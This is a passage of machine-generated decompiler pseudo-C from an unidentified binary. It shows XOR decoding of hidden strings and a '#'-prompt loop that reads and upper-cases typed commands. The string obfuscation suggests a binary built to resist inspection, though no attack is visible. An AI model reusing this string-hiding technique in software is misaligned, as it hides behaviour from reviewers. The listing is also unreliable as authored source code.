        bVar63 = UNK_00177794;
        bVar62 = UNK_00177793;
        bVar61 = UNK_00177792;
        bVar60 = UNK_00177791;
        bVar59 = DAT_00177790;
        uVar7 = *(undefined8 *)(pbVar23 + 0x18);
        uVar24 = *(undefined8 *)(pbVar23 + 0x10);
        pbVar23[0x20] = pbVar23[0x20] ^ 0xad;
        pbVar23[0x21] = pbVar23[0x21] ^ 0x65;
        pbVar23[0x22] = pbVar23[0x22] ^ 0xa9;
        pbVar23[0x23] = pbVar23[0x23] ^ 0xbf;
        auVar54._0_8_ =
             CONCAT17(pbVar23[7] ^ bVar66,
                      CONCAT16(pbVar23[6] ^ bVar65,
                               CONCAT15(pbVar23[5] ^ bVar64,
                                        CONCAT14(pbVar23[4] ^ bVar63,
                                                 CONCAT13(pbVar23[3] ^ bVar62,
                                                          CONCAT12(pbVar23[2] ^ bVar61,
                                                                   CONCAT11(pbVar23[1] ^ bVar60,
                                                                            *pbVar23 ^ bVar59)))))))
        ;
        auVar54[8] = pbVar23[8] ^ bVar67;
        auVar54[9] = pbVar23[9] ^ bVar68;
        auVar54[10] = pbVar23[10] ^ bVar69;
        auVar54[0xb] = pbVar23[0xb] ^ bVar70;
        auVar54[0xc] = pbVar23[0xc] ^ bVar71;
        auVar54[0xd] = pbVar23[0xd] ^ bVar72;
        auVar54[0xe] = pbVar23[0xe] ^ bVar73;
        auVar54[0xf] = pbVar23[0xf] ^ bVar74;
        pbVar23[0x2b] = 0;
        pbVar23[0x24] = pbVar23[0x24] ^ 0x77;
        pbVar23[0x25] = pbVar23[0x25] ^ 0x8b;
        pbVar23[0x26] = pbVar23[0x26] ^ 0xcb;
        auVar48._0_8_ =
             CONCAT17((byte)((ulong)uVar24 >> 0x38) ^ bVar66,
                      CONCAT16((byte)((ulong)uVar24 >> 0x30) ^ bVar65,
                               CONCAT15((byte)((ulong)uVar24 >> 0x28) ^ bVar64,
                                        CONCAT14((byte)((ulong)uVar24 >> 0x20) ^ bVar63,
                                                 CONCAT13((byte)((ulong)uVar24 >> 0x18) ^ bVar62,
                                                          CONCAT12((byte)((ulong)uVar24 >> 0x10) ^
                                                                   bVar61,CONCAT11((byte)((ulong)
                                                  uVar24 >> 8) ^ bVar60,(byte)uVar24 ^ bVar59)))))))
        ;
        auVar48[8] = (byte)uVar7 ^ bVar67;
        auVar48[9] = (byte)((ulong)uVar7 >> 8) ^ bVar68;
        auVar48[10] = (byte)((ulong)uVar7 >> 0x10) ^ bVar69;
        auVar48[0xb] = (byte)((ulong)uVar7 >> 0x18) ^ bVar70;
        auVar48[0xc] = (byte)((ulong)uVar7 >> 0x20) ^ bVar71;
        auVar48[0xd] = (byte)((ulong)uVar7 >> 0x28) ^ bVar72;
        auVar48[0xe] = (byte)((ulong)uVar7 >> 0x30) ^ bVar73;
        auVar48[0xf] = (byte)((ulong)uVar7 >> 0x38) ^ bVar74;
        pbVar23[0x27] = pbVar23[0x27] ^ 0x85;
        pbVar23[0x28] = pbVar23[0x28] ^ 0xad;
        *(long *)(pbVar23 + 8) = auVar54._8_8_;
        *(undefined8 *)pbVar23 = auVar54._0_8_;
        *(long *)(pbVar23 + 0x18) = auVar48._8_8_;
        *(undefined8 *)(pbVar23 + 0x10) = auVar48._0_8_;
        pbVar23[0x29] = pbVar23[0x29] ^ 0x65;
        pbVar23[0x2a] = pbVar23[0x2a] ^ 0xa9;
      }
      pcVar26 = (char *)FUN_002295c4(&DAT_00235e70);
      sVar27 = strlen(pcVar26);
      if (0xffffffffffffffef < sVar27) {
LAB_001a33c0:
                    /* WARNING: Subroutine does not return */
        FUN_00203188(&local_1178);
      }
      if (sVar27 < 0x17) {
        pbVar23 = (byte *)((ulong)&local_1178 | 1);
        local_1178 = CONCAT71(local_1178._1_7_,(char)((int)sVar27 << 1));
        if (sVar27 == 0) goto LAB_001a2494;
        puVar30 = &DAT_00235e70;
      }
      else {
        uVar32 = sVar27 + 0x10 & 0xfffffffffffffff0;
        pbVar23 = (byte *)FUN_00202bc0(uVar32);
        local_1178 = uVar32 | 1;
        puVar30 = &DAT_00235e70;
        sStack_1170 = sVar27;
        local_1168 = pbVar23;
      }
LAB_001a2480:
      pvVar31 = (void *)FUN_002295c4(puVar30);
      memcpy(pbVar23,pvVar31,sVar27);
    }
LAB_001a2494:
    pbVar23[sVar27] = 0;
    FUN_00208ffc(&local_150,uVar21);
    uVar32 = (ulong)(local_150 >> 1);
    pbVar23 = (byte *)((ulong)&local_150 | 1);
    if ((local_150 & 1) != 0) {
      uVar32 = CONCAT26(uStack_142,uStack_148);
      pbVar23 = local_140;
    }
    pauVar28 = (undefined1 (*) [16])FUN_0020417c(&local_1178,pbVar23,uVar32);
    local_1140 = *(void **)pauVar28[1];
    sStack_1148 = SUB168(*pauVar28,8);
    local_1150 = SUB168(*pauVar28,0);
    *(undefined8 *)(*pauVar28 + 8) = 0;
    *(undefined8 *)pauVar28[1] = 0;
    *(undefined8 *)*pauVar28 = 0;
    if (local_11a0 < local_1198) {
      local_11a0[2] = (ulong)local_1140;
      local_11a0[1] = sStack_1148;
      *local_11a0 = local_1150;
      sStack_1148 = 0;
      local_1140 = (void *)0x0;
      local_1150 = 0;
      local_11a0 = local_11a0 + 3;
    }
    else {
      FUN_001b6204(&local_11a8,&local_1150);
      if ((local_1150 & 1) != 0) {
        free(local_1140);
      }
    }
    if ((local_150 & 1) != 0) {
      free(local_140);
    }
    puVar41 = local_11a8;
    puVar42 = local_11a0;
    if ((local_1178 & 1) != 0) {
      free(local_1168);
      puVar41 = local_11a8;
      puVar42 = local_11a0;
    }
    for (; puVar19 = local_11a0, puVar41 != local_11a0; puVar41 = puVar41 + 3) {
      local_11a0 = puVar42;
      FUN_002036bc(local_11c0,puVar41);
      uVar32 = FUN_001a68d8(param_1,local_11c0);
      if ((local_11c0[0] & 1) != 0) {
        free(local_11b0);
      }
      if ((uVar32 & 1) != 0) goto LAB_001a2678;
      puVar42 = local_11a0;
      local_11a0 = puVar19;
    }
    local_11a0 = puVar42;
    pbVar23 = (byte *)FUN_002295c4(&DAT_00235ed0);
    if ((*pbVar23 & 1) == 0) {
      uVar24 = FUN_002295c4(&DAT_00235eb0);
      FUN_001b4e20(uVar24,&DAT_001795f3);
      FUN_002234c0(&LAB_001b4fc4,uVar24,0x2362d0);
      puVar29 = (undefined1 *)FUN_002295c4(&DAT_00235ed0);
      *puVar29 = 1;
      lVar25 = FUN_002295c4(&DAT_00235eb0);
      cVar1 = *(char *)(lVar25 + 0x33);
    }
    else {
      lVar25 = FUN_002295c4(&DAT_00235eb0);
      cVar1 = *(char *)(lVar25 + 0x33);
    }
    if (cVar1 != '\0') {
      pbVar23 = (byte *)FUN_002295c4(&DAT_00235eb0);
      uVar7 = *(undefined8 *)(pbVar23 + 0x18);
      uVar24 = *(undefined8 *)(pbVar23 + 0x10);
      pbVar23[0x33] = 0;
      uVar37 = *(undefined8 *)(pbVar23 + 0x28);
      uVar35 = *(undefined8 *)(pbVar23 + 0x20);
      auVar57._0_8_ =
           CONCAT17(pbVar23[7] ^ UNK_00177607,
                    CONCAT16(pbVar23[6] ^ UNK_00177606,
                             CONCAT15(pbVar23[5] ^ UNK_00177605,
                                      CONCAT14(pbVar23[4] ^ UNK_00177604,
                                               CONCAT13(pbVar23[3] ^ UNK_00177603,
                                                        CONCAT12(pbVar23[2] ^ UNK_00177602,
                                                                 CONCAT11(pbVar23[1] ^ UNK_00177601,
                                                                          *pbVar23 ^ DAT_00177600)))
                                              ))));
      auVar57[8] = pbVar23[8] ^ UNK_00177608;
      auVar57[9] = pbVar23[9] ^ UNK_00177609;
      auVar57[10] = pbVar23[10] ^ UNK_0017760a;
      auVar57[0xb] = pbVar23[0xb] ^ UNK_0017760b;
      auVar57[0xc] = pbVar23[0xc] ^ UNK_0017760c;
      auVar57[0xd] = pbVar23[0xd] ^ UNK_0017760d;
      auVar57[0xe] = pbVar23[0xe] ^ UNK_0017760e;
      auVar57[0xf] = pbVar23[0xf] ^ UNK_0017760f;
      bVar59 = (byte)uVar24 ^ DAT_00177600;
      bVar60 = (byte)((ulong)uVar24 >> 8) ^ UNK_00177601;
      bVar61 = (byte)((ulong)uVar24 >> 0x10) ^ UNK_00177602;
      bVar62 = (byte)((ulong)uVar24 >> 0x18) ^ UNK_00177603;
      bVar63 = (byte)((ulong)uVar24 >> 0x20) ^ UNK_00177604;
      bVar64 = (byte)((ulong)uVar24 >> 0x28) ^ UNK_00177605;
      bVar65 = (byte)((ulong)uVar24 >> 0x30) ^ UNK_00177606;
      bVar66 = (byte)((ulong)uVar24 >> 0x38) ^ UNK_00177607;
      bVar67 = (byte)uVar7 ^ UNK_00177608;
      bVar68 = (byte)((ulong)uVar7 >> 8) ^ UNK_00177609;
      bVar69 = (byte)((ulong)uVar7 >> 0x10) ^ UNK_0017760a;
      bVar70 = (byte)((ulong)uVar7 >> 0x18) ^ UNK_0017760b;
      bVar71 = (byte)((ulong)uVar7 >> 0x20) ^ UNK_0017760c;
      bVar72 = (byte)((ulong)uVar7 >> 0x28) ^ UNK_0017760d;
      bVar73 = (byte)((ulong)uVar7 >> 0x30) ^ UNK_0017760e;
      bVar74 = (byte)((ulong)uVar7 >> 0x38) ^ UNK_0017760f;
      auVar51._0_8_ =
           CONCAT17((byte)((ulong)uVar35 >> 0x38) ^ UNK_00177607,
                    CONCAT16((byte)((ulong)uVar35 >> 0x30) ^ UNK_00177606,
                             CONCAT15((byte)((ulong)uVar35 >> 0x28) ^ UNK_00177605,
                                      CONCAT14((byte)((ulong)uVar35 >> 0x20) ^ UNK_00177604,
                                               CONCAT13((byte)((ulong)uVar35 >> 0x18) ^ UNK_00177603
                                                        ,CONCAT12((byte)((ulong)uVar35 >> 0x10) ^
                                                                  UNK_00177602,
                                                                  CONCAT11((byte)((ulong)uVar35 >> 8
                                                                                 ) ^ UNK_00177601,
                                                                           (byte)uVar35 ^
                                                                           DAT_00177600)))))));
      auVar51[8] = (byte)uVar37 ^ UNK_00177608;
      auVar51[9] = (byte)((ulong)uVar37 >> 8) ^ UNK_00177609;
      auVar51[10] = (byte)((ulong)uVar37 >> 0x10) ^ UNK_0017760a;
      auVar51[0xb] = (byte)((ulong)uVar37 >> 0x18) ^ UNK_0017760b;
      auVar51[0xc] = (byte)((ulong)uVar37 >> 0x20) ^ UNK_0017760c;
      auVar51[0xd] = (byte)((ulong)uVar37 >> 0x28) ^ UNK_0017760d;
      auVar51[0xe] = (byte)((ulong)uVar37 >> 0x30) ^ UNK_0017760e;
      auVar51[0xf] = (byte)((ulong)uVar37 >> 0x38) ^ UNK_0017760f;
      pbVar23[0x30] = pbVar23[0x30] ^ 0xa7;
      pbVar23[0x31] = pbVar23[0x31] ^ 0x1d;
      *(long *)(pbVar23 + 8) = auVar57._8_8_;
      *(undefined8 *)pbVar23 = auVar57._0_8_;
      *(ulong *)(pbVar23 + 0x18) =
           CONCAT17(bVar74,CONCAT16(bVar73,CONCAT15(bVar72,CONCAT14(bVar71,CONCAT13(bVar70,CONCAT12(
                                                  bVar69,CONCAT11(bVar68,bVar67)))))));
      *(ulong *)(pbVar23 + 0x10) =
           CONCAT17(bVar66,CONCAT16(bVar65,CONCAT15(bVar64,CONCAT14(bVar63,CONCAT13(bVar62,CONCAT12(
                                                  bVar61,CONCAT11(bVar60,bVar59)))))));
      *(long *)(pbVar23 + 0x28) = auVar51._8_8_;
      *(undefined8 *)(pbVar23 + 0x20) = auVar51._0_8_;
      pbVar23[0x32] = pbVar23[0x32] ^ 0x71;
    }
    pcVar26 = (char *)FUN_002295c4(&DAT_00235eb0);
    sVar27 = strlen(pcVar26);
    if (0xffffffffffffffef < sVar27) {
LAB_001a33d4:
                    /* WARNING: Subroutine does not return */
      FUN_00203188(&local_1150);
    }
    if (0x16 < sVar27) {
      uVar32 = sVar27 + 0x10 & 0xfffffffffffffff0;
      pvVar31 = (void *)FUN_00202bc0(uVar32);
      puVar30 = &DAT_00235eb0;
      goto LAB_001a26e8;
    }
    pvVar31 = (void *)((ulong)&local_1150 | 1);
    local_1150 = CONCAT71(local_1150._1_7_,(char)((int)sVar27 << 1));
    if (sVar27 != 0) {
      puVar30 = &DAT_00235eb0;
      goto LAB_001a26ec;
    }
  }
LAB_001a2700:
  *(undefined1 *)((long)pvVar31 + sVar27) = 0;
  FUN_00208ffc(&local_1178,uVar21);
  sVar27 = local_1178 >> 1 & 0x7f;
  pbVar23 = (byte *)((ulong)&local_1178 | 1);
  if ((local_1178 & 1) != 0) {
    sVar27 = sStack_1170;
    pbVar23 = local_1168;
  }
  puVar33 = (undefined8 *)FUN_0020417c(&local_1150,pbVar23,sVar27);
  uVar24 = *(undefined8 *)((long)puVar33 + 2);
  uVar2 = *(undefined1 *)puVar33;
  uVar3 = *(undefined1 *)((long)puVar33 + 1);
  local_150 = (byte)uVar24;
  bStack_14f = (byte)((ulong)uVar24 >> 8);
  uStack_14e = (undefined4)((ulong)uVar24 >> 0x10);
  uVar24 = puVar33[2];
  uStack_14a = (undefined2)puVar33[1];
  uStack_148 = (undefined6)((ulong)puVar33[1] >> 0x10);
  puVar33[1] = 0;
  puVar33[2] = 0;
  *puVar33 = 0;
  if ((*pbVar43 & 1) != 0) {
    free(*(void **)(param_2 + 0x40));
  }
  *(undefined1 *)(param_2 + 0x30) = uVar2;
  *(undefined1 *)(param_2 + 0x31) = uVar3;
  *(ulong *)(param_2 + 0x32) =
       CONCAT26(uStack_14a,CONCAT42(uStack_14e,CONCAT11(bStack_14f,local_150)));
  *(ulong *)(param_2 + 0x38) = CONCAT62(uStack_148,uStack_14a);
  *(undefined8 *)(param_2 + 0x40) = uVar24;
  if ((local_1178 & 1) != 0) {
    free(local_1168);
  }
  if ((local_1150 & 1) != 0) {
    free(local_1140);
  }
LAB_001a27a0:
  puVar18 = PTR_stdin_00231ed8;
  puVar30 = PTR_stdout_00231ed0;
  uVar7 = _UNK_00176b68;
  uVar24 = _DAT_00176b60;
  pbVar43 = (byte *)((ulong)&local_150 | 1);
  puVar33 = (undefined8 *)((ulong)&local_150 | 2);
  do {
    do {
      do {
        printf("\n\n  # ");
        fflush(*(FILE **)puVar30);
        pcVar26 = fgets((char *)&local_1150,0x1000,*(FILE **)puVar18);
      } while (pcVar26 == (char *)0x0);
      sVar27 = strcspn((char *)&local_1150,"\r\n");
      *(undefined1 *)((long)&local_1150 + sVar27) = 0;
      lVar25 = __strlen_chk(&local_1150,0x1000);
    } while (lVar25 == 0);
    sVar27 = strlen((char *)&local_1150);
    if (0xffffffffffffffef < sVar27) {
                    /* WARNING: Subroutine does not return */
      FUN_00203188(&local_150);
    }
    if (sVar27 < 0x17) {
      local_150 = (byte)((int)sVar27 << 1);
      pbVar23 = pbVar43;
      if (sVar27 != 0) goto LAB_001a28b0;
    }
    else {
      uVar32 = sVar27 + 0x10 & 0xfffffffffffffff0;
      pbVar23 = (byte *)FUN_00202bc0(uVar32);
      local_150 = (byte)uVar32 | 1;
      uStack_148 = (undefined6)sVar27;
      uStack_142 = (undefined2)(sVar27 >> 0x30);
      bStack_14f = (byte)(uVar32 >> 8);
      uStack_14e = (undefined4)(uVar32 >> 0x10);
      uStack_14a = (undefined2)(uVar32 >> 0x30);
      local_140 = pbVar23;
LAB_001a28b0:
      memcpy(pbVar23,&local_1150,sVar27);
    }
    pbVar23[sVar27] = 0;
    pbVar23 = pbVar43;
    uVar32 = (ulong)(local_150 >> 1);
    if ((local_150 & 1) != 0) {
      pbVar23 = local_140;
      uVar32 = CONCAT26(uStack_142,uStack_148);
    }
    if (uVar32 != 0) {
      pbVar34 = pbVar23;
      if (7 < uVar32) {
        if (uVar32 < 0x20) {
          uVar38 = 0;
        }
        else {
          uVar38 = uVar32 & 0xffffffffffffffe0;
          pauVar28 = (undefined1 (*) [16])(pbVar23 + 0x10);
          uVar40 = uVar38;
          do {
            bVar59 = pauVar28[-1][0];
            bVar60 = pauVar28[-1][1];
            bVar61 = pauVar28[-1][2];
            bVar62 = pauVar28[-1][3];
            bVar63 = pauVar28[-1][4];
            bVar64 = pauVar28[-1][5];
            bVar65 = pauVar28[-1][6];
            bVar66 = pauVar28[-1][7];
            bVar67 = pauVar28[-1][8];
            bVar68 = pauVar28[-1][9];
            bVar69 = pauVar28[-1][10];
            bVar70 = pauVar28[-1][0xb];
            bVar71 = pauVar28[-1][0xc];
            bVar72 = pauVar28[-1][0xd];
            bVar73 = pauVar28[-1][0xe];
            bVar74 = pauVar28[-1][0xf];
            auVar58 = *pauVar28;
            uVar40 = uVar40 - 0x20;
            bVar45 = auVar58[0xd];
            uVar8 = (uint6)CONCAT14(-(bVar72 - 0x61 < 0x1a),
                                    -(uint)((CONCAT12(bVar72,(ushort)bVar71) & 0xffff) - 0x61 < 0x1a
                                           )) & 0xffff0000ffff;
            uVar5 = (uint6)CONCAT14(-(bVar64 - 0x61 < 0x1a),
                                    -(uint)((CONCAT12(bVar64,(ushort)bVar63) & 0xffff) - 0x61 < 0x1a
                                           )) & 0xffff0000ffff;
            uVar12 = (uint6)CONCAT14(-(bVar45 - 0x61 < 0x1a),
                                     -(uint)((CONCAT12(bVar45,(ushort)auVar58[0xc]) & 0xffff) - 0x61
                                            < 0x1a)) & 0xffff0000ffff;
            uVar14 = (uint6)CONCAT14(-(auVar58[5] - 0x61 < 0x1a),
                                     -(uint)((CONCAT12(auVar58[5],(ushort)auVar58[4]) & 0xffff) -
                                             0x61 < 0x1a)) & 0xffff0000ffff;
            uVar9 = CONCAT12(-(bVar68 - 0x61 < 0x1a),-(ushort)(bVar67 - 0x61 < 0x1a)) & 0xff00ff;
            uVar6 = CONCAT12(-(bVar60 - 0x61 < 0x1a),-(ushort)(bVar59 - 0x61 < 0x1a)) & 0xff00ff;
            uVar13 = CONCAT12(-(auVar58[9] - 0x61 < 0x1a),-(ushort)(auVar58[8] - 0x61 < 0x1a)) &
                     0xff00ff;
            uVar15 = CONCAT12(-(auVar58[1] - 0x61 < 0x1a),-(ushort)(auVar58[0] - 0x61 < 0x1a)) &
                     0xff00ff;
            auVar17[8] = auVar58[8] ^ 0x20;
            auVar17._0_8_ = auVar58._0_8_ ^ 0x2020202020202020;
            auVar17[9] = auVar58[9] ^ 0x20;
            auVar17[10] = auVar58[10] ^ 0x20;
            auVar17[0xb] = auVar58[0xb] ^ 0x20;
            auVar17[0xc] = auVar58[0xc] ^ 0x20;
            auVar17[0xd] = bVar45 ^ 0x20;
            auVar17[0xe] = auVar58[0xe] ^ 0x20;
            auVar17[0xf] = auVar58[0xf] ^ 0x20;
            auVar11[1] = (char)(uVar15 >> 0x10);
            auVar11[0] = (char)uVar15;
            auVar11[2] = -(auVar58[2] - 0x61 < 0x1a);
            auVar11[3] = -(auVar58[3] - 0x61 < 0x1a);
            auVar11[4] = (char)uVar14;
            auVar11[5] = (char)(uVar14 >> 0x20);
            auVar11[6] = -(auVar58[6] - 0x61 < 0x1a);
            auVar11[7] = -(auVar58[7] - 0x61 < 0x1a);
            auVar11[8] = (char)uVar13;
            auVar11[9] = (char)(uVar13 >> 0x10);
            auVar11[10] = -(auVar58[10] - 0x61 < 0x1a);
            auVar11[0xb] = -(auVar58[0xb] - 0x61 < 0x1a);
            auVar11[0xc] = (char)uVar12;
            auVar11[0xd] = (char)(uVar12 >> 0x20);
            auVar11[0xe] = -(auVar58[0xe] - 0x61 < 0x1a);
            auVar11[0xf] = -(auVar58[0xf] - 0x61 < 0x1a);
            auVar58 = auVar58 ^ (auVar58 ^ auVar17) & auVar11;
            pauVar28[-1][8] = bVar67 ^ (bVar67 ^ bVar67 ^ 0x20) & (byte)uVar9;
            pauVar28[-1][9] = bVar68 ^ (bVar68 ^ bVar68 ^ 0x20) & (byte)(uVar9 >> 0x10);
            pauVar28[-1][10] = bVar69 ^ (bVar69 ^ bVar69 ^ 0x20) & -(bVar69 - 0x61 < 0x1a);
            pauVar28[-1][0xb] = bVar70 ^ (bVar70 ^ bVar70 ^ 0x20) & -(bVar70 - 0x61 < 0x1a);
            pauVar28[-1][0xc] = bVar71 ^ (bVar71 ^ bVar71 ^ 0x20) & (byte)uVar8;
            pauVar28[-1][0xd] = bVar72 ^ (bVar72 ^ bVar72 ^ 0x20) & (byte)(uVar8 >> 0x20);
            pauVar28[-1][0xe] = bVar73 ^ (bVar73 ^ bVar73 ^ 0x20) & -(bVar73 - 0x61 < 0x1a);
            pauVar28[-1][0xf] = bVar74 ^ (bVar74 ^ bVar74 ^ 0x20) & -(bVar74 - 0x61 < 0x1a);
            pauVar28[-1][0] = bVar59 ^ (bVar59 ^ bVar59 ^ 0x20) & (byte)uVar6;
            pauVar28[-1][1] = bVar60 ^ (bVar60 ^ bVar60 ^ 0x20) & (byte)(uVar6 >> 0x10);
            pauVar28[-1][2] = bVar61 ^ (bVar61 ^ bVar61 ^ 0x20) & -(bVar61 - 0x61 < 0x1a);
            pauVar28[-1][3] = bVar62 ^ (bVar62 ^ bVar62 ^ 0x20) & -(bVar62 - 0x61 < 0x1a);
            pauVar28[-1][4] = bVar63 ^ (bVar63 ^ bVar63 ^ 0x20) & (byte)uVar5;
            pauVar28[-1][5] = bVar64 ^ (bVar64 ^ bVar64 ^ 0x20) & (byte)(uVar5 >> 0x20);
            pauVar28[-1][6] = bVar65 ^ (bVar65 ^ bVar65 ^ 0x20) & -(bVar65 - 0x61 < 0x1a);
            pauVar28[-1][7] = bVar66 ^ (bVar66 ^ bVar66 ^ 0x20) & -(bVar66 - 0x61 < 0x1a);
            *(long *)(*pauVar28 + 8) = auVar58._8_8_;
            *(long *)*pauVar28 = auVar58._0_8_;
            pauVar28 = pauVar28 + 2;
          } while (uVar40 != 0);
          if (uVar32 == uVar38) goto LAB_001a2a44;
          if ((uVar32 & 0x18) == 0) {
            pbVar34 = pbVar23 + uVar38;
            goto LAB_001a2a20;
          }
        }
        uVar40 = uVar32 & 0xfffffffffffffff8;
        pbVar34 = pbVar23 + uVar40;
        lVar25 = uVar38 - uVar40;
        puVar41 = (ulong *)(pbVar23 + uVar38);
        do {
          uVar38 = *puVar41;
          lVar25 = lVar25 + 8;
          bVar59 = (byte)(uVar38 >> 8);
          uVar5 = (uint6)CONCAT14(-((byte)(uVar38 >> 0x28) - 0x61 < 0x1a),
                                  -(uint)((byte)(uVar38 >> 0x20) - 0x61 < 0x1a)) & 0xffff0000ffff;
          *puVar41 = uVar38 ^ (uVar38 ^ uVar38 ^ 0x2020202020202020) &
                              CONCAT17(-((byte)(uVar38 >> 0x38) - 0x61 < 0x1a),
                                       CONCAT16(-((byte)(uVar38 >> 0x30) - 0x61 < 0x1a),
                                                CONCAT15((char)(uVar5 >> 0x20),
                                                         CONCAT14((char)uVar5,
                                                                  CONCAT13(-((byte)(uVar38 >> 0x18)
                                                                             - 0x61 < 0x1a),
                                                                           CONCAT12(-((byte)(uVar38 
                                                  >> 0x10) - 0x61 < 0x1a),
                                                  CONCAT11(-(bVar59 - 0x61 < 0x1a),
                                                           -((CONCAT12(bVar59,(ushort)(byte)uVar38)
                                                             & 0xffff) - 0x61 < 0x1a))))))));
          puVar41 = puVar41 + 1;
        } while (lVar25 != 0);
        if (uVar32 == uVar40) goto LAB_001a2a44;
      }
LAB_001a2a20:
      do {
        bVar60 = *pbVar34;
        bVar59 = bVar60 ^ 0x20;
        if (0x19 < bVar60 - 0x61) {
          bVar59 = bVar60;
        }
        pbVar39 = pbVar34 + 1;
        *pbVar34 = bVar59;
        pbVar34 = pbVar39;
      } while (pbVar39 != pbVar23 + uVar32);
    }
LAB_001a2a44:
    FUN_002043ac(&local_1178,&local_150,0,3,&local_150);
    sVar27 = local_1178 >> 1 & 0x7f;
    if ((local_1178 & 1) != 0) {
      sVar27 = sStack_1170;
    }
    if (sVar27 == 3) {
      iVar22 = FUN_00204bb4(&local_1178,0,0xffffffffffffffff,&DAT_0013ec03,3);
      bVar20 = iVar22 == 0;
    }
    else {
      bVar20 = false;
    }
    if ((local_1178 & 1) != 0) {
      free(local_1168);
    }
    if (bVar20) {
      FUN_0019e22c(&local_1178);
      if ((local_150 & 1) != 0) {
        free(local_140);
      }
      uStack_148 = (undefined6)sStack_1170;
      uStack_142 = (undefined2)(sStack_1170 >> 0x30);
      local_150 = (byte)local_1178;
      bStack_14f = (byte)(local_1178 >> 8);
      uStack_14e = (undefined4)(local_1178 >> 0x10);
      uStack_14a = (undefined2)(local_1178 >> 0x30);
      local_140 = local_1168;
    }
    pbVar23 = pbVar43;
    uVar32 = (ulong)(local_150 >> 1);
    if ((local_150 & 1) != 0) {
      pbVar23 = local_140;
      uVar32 = CONCAT26(uStack_142,uStack_148);
    }
    if (uVar32 != 0) {
      pbVar34 = pbVar23;
      if (7 < uVar32) {
        if (uVar32 < 0x20) {
          uVar38 = 0;
        }
        else {
          uVar38 = uVar32 & 0xffffffffffffffe0;
          pauVar28 = (undefined1 (*) [16])(pbVar23 + 0x10);
          uVar40 = uVar38;
          do {
            bVar59 = pauVar28[-1][0];
            bVar60 = pauVar28[-1][1];
            bVar61 = pauVar28[-1][2];
            bVar62 = pauVar28[-1][3];
            bVar63 = pauVar28[-1][4];
            bVar64 = pauVar28[-1][5];
            bVar65 = pauVar28[-1][6];
            bVar66 = pauVar28[-1][7];
            bVar67 = pauVar28[-1][8];
            bVar68 = pauVar28[-1][9];
            bVar69 = pauVar28[-1][10];
            bVar70 = pauVar28[-1][0xb];
            bVar71 = pauVar28[-1][0xc];
            bVar72 = pauVar28[-1][0xd];
            bVar73 = pauVar28[-1][0xe];
            bVar74 = pauVar28[-1][0xf];
            auVar58 = *pauVar28;
            uVar40 = uVar40 - 0x20;
            bVar45 = auVar58[0xd];
            uVar8 = (uint6)CONCAT14(-(bVar72 - 0x61 < 0x1a),
                                    -(uint)((CONCAT12(bVar72,(ushort)bVar71) & 0xffff) - 0x61 < 0x1a
                                           )) & 0xffff0000ffff;
            uVar5 = (uint6)CONCAT14(-(bVar64 - 0x61 < 0x1a),
                                    -(uint)((CONCAT12(bVar64,(ushort)bVar63) & 0xffff) - 0x61 < 0x1a
                                           )) & 0xffff0000ffff;
            uVar12 = (uint6)CONCAT14(-(bVar45 - 0x61 < 0x1a),
                                     -(uint)((CONCAT12(bVar45,(ushort)auVar58[0xc]) & 0xffff) - 0x61
                                            < 0x1a)) & 0xffff0000ffff;
            uVar14 = (uint6)CONCAT14(-(auVar58[5] - 0x61 < 0x1a),
                                     -(uint)((CONCAT12(auVar58[5],(ushort)auVar58[4]) & 0xffff) -
                                             0x61 < 0x1a)) & 0xffff0000ffff;
            uVar9 = CONCAT12(-(bVar68 - 0x61 < 0x1a),-(ushort)(bVar67 - 0x61 < 0x1a)) & 0xff00ff;
            uVar6 = CONCAT12(-(bVar60 - 0x61 < 0x1a),-(ushort)(bVar59 - 0x61 < 0x1a)) & 0xff00ff;
            uVar13 = CONCAT12(-(auVar58[9] - 0x61 < 0x1a),-(ushort)(auVar58[8] - 0x61 < 0x1a)) &
                     0xff00ff;
            uVar15 = CONCAT12(-(auVar58[1] - 0x61 < 0x1a),-(ushort)(auVar58[0] - 0x61 < 0x1a)) &
                     0xff00ff;
            auVar16[8] = auVar58[8] ^ 0x20;
            auVar16._0_8_ = auVar58._0_8_ ^ 0x2020202020202020;
            auVar16[9] = auVar58[9] ^ 0x20;
            auVar16[10] = auVar58[10] ^ 0x20;
            auVar16[0xb] = auVar58[0xb] ^ 0x20;
            auVar16[0xc] = auVar58[0xc] ^ 0x20;
            auVar16[0xd] = bVar45 ^ 0x20;
            auVar16[0xe] = auVar58[0xe] ^ 0x20;
            auVar16[0xf] = auVar58[0xf] ^ 0x20;
            auVar10[1] = (char)(uVar15 >> 0x10);
            auVar10[0] = (char)uVar15;
            auVar10[2] = -(auVar58[2] - 0x61 < 0x1a);
            auVar10[3] = -(auVar58[3] - 0x61 < 0x1a);
            auVar10[4] = (char)uVar14;
            auVar10[5] = (char)(uVar14 >> 0x20);
            auVar10[6] = -(auVar58[6] - 0x61 < 0x1a);
            auVar10[7] = -(auVar58[7] - 0x61 < 0x1a);
            auVar10[8] = (char)uVar13;
            auVar10[9] = (char)(uVar13 >> 0x10);
            auVar10[10] = -(auVar58[10] - 0x61 < 0x1a);
            auVar10[0xb] = -(auVar58[0xb] - 0x61 < 0x1a);
            auVar10[0xc] = (char)uVar12;
            auVar10[0xd] = (char)(uVar12 >> 0x20);
            auVar10[0xe] = -(auVar58[0xe] - 0x61 < 0x1a);
            auVar10[0xf] = -(auVar58[0xf] - 0x61 < 0x1a);
            auVar58 = auVar58 ^ (auVar58 ^ auVar16) & auVar10;
            pauVar28[-1][8] = bVar67 ^ (bVar67 ^ bVar67 ^ 0x20) & (byte)uVar9;
            pauVar28[-1][9] = bVar68 ^ (bVar68 ^ bVar68 ^ 0x20) & (byte)(uVar9 >> 0x10);
            pauVar28[-1][10] = bVar69 ^ (bVar69 ^ bVar69 ^ 0x20) & -(bVar69 - 0x61 < 0x1a);
            pauVar28[-1][0xb] = bVar70 ^ (bVar70 ^ bVar70 ^ 0x20) & -(bVar70 - 0x61 < 0x1a);
            pauVar28[-1][0xc] = bVar71 ^ (bVar71 ^ bVar71 ^ 0x20) & (byte)uVar8;
            pauVar28[-1][0xd] = bVar72 ^ (bVar72 ^ bVar72 ^ 0x20) & (byte)(uVar8 >> 0x20);
            pauVar28[-1][0xe] = bVar73 ^ (bVar73 ^ bVar73 ^ 0x20) & -(bVar73 - 0x61 < 0x1a);
            pauVar28[-1][0xf] = bVar74 ^ (bVar74 ^ bVar74 ^ 0x20) & -(bVar74 - 0x61 < 0x1a);
            pauVar28[-1][0] = bVar59 ^ (bVar59 ^ bVar59 ^ 0x20) & (byte)uVar6;
